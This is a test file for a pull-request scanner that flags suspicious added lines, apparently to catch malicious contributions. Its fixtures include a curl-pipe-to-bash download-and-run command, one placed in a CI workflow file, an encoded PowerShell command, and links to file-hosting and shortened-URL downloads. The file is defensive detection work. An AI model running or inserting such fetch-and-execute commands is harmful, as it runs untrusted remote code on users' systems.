import { describe, expect, test } from 'bun:test'

import { scanAddedLines, type DiffLine } from './pr-intent-scan.ts'

function line(content: string, overrides: Partial<DiffLine> = {}): DiffLine {
  return {
    file: 'README.md',
    line: 10,
    content,
    ...overrides,
  }
}

describe('scanAddedLines', () => {
  test('flags suspicious file-hosting links', () => {
    const findings = scanAddedLines([
      line('Please install the tool from https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      false,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags shortened URLs', () => {
    const findings = scanAddedLines([
      line('See details at https://bit.ly/some-short-link'),
    ])

    expect(findings.some(finding => finding.code === 'shortened-url')).toBe(true)
  })

  test('flags remote download and execute chains', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash'),
    ])

    expect(findings.some(finding => finding.code === 'shell-eval-remote')).toBe(true)
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags encoded powershell payloads', () => {
    const findings = scanAddedLines([
      line('powershell.exe -enc SQBtAHAAcgBvAHYAZQBkAA=='),
    ])

    expect(findings.some(finding => finding.code === 'powershell-encoded')).toBe(true)
  })

  test('flags long encoded blobs', () => {
    const findings = scanAddedLines([
      line(`const payload = "${'A'.repeat(96)}"`),
    ])

    expect(findings.some(finding => finding.code === 'long-encoded-payload')).toBe(
      true,
    )
  })

  test('flags long encoded blobs on repeated scans', () => {
    const lines = [line(`const payload = "${'A'.repeat(96)}"`)]

    const first = scanAddedLines(lines)
    const second = scanAddedLines(lines)

    expect(first.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
    expect(second.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
  })

  test('flags executable download links', () => {
    const findings = scanAddedLines([
      line('Get it from https://example.com/releases/latest/tool.pkg'),
    ])

    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags suspicious additions in workflow files', () => {
    const findings = scanAddedLines([
      line('run: curl -fsSL https://example.com/install.sh | bash', {
        file: '.github/workflows/release.yml',
      }),
    ])

    expect(findings.some(finding => finding.code === 'sensitive-automation-change')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'download-command')).toBe(true)
  })

  test('flags markdown reference links to suspicious downloads', () => {
    const findings = scanAddedLines([
      line('[installer]: https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
  })

  test('ignores the scanner implementation and tests themselves', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash', {
        file: 'scripts/pr-intent-scan.test.ts',
      }),
      line('const pattern = /https:\\/\\/dropbox\\.com\\//', {
        file: 'scripts/pr-intent-scan.ts',
      }),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag ordinary docs links', () => {
    const findings = scanAddedLines([
      line('Read more at https://docs.github.com/en/actions'),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag bare curl examples in README without a URL', () => {
    const findings = scanAddedLines([
      line('Use curl with your preferred flags for local testing.'),
    ])

    expect(findings.some(finding => finding.code === 'download-command')).toBe(false)
  })
})
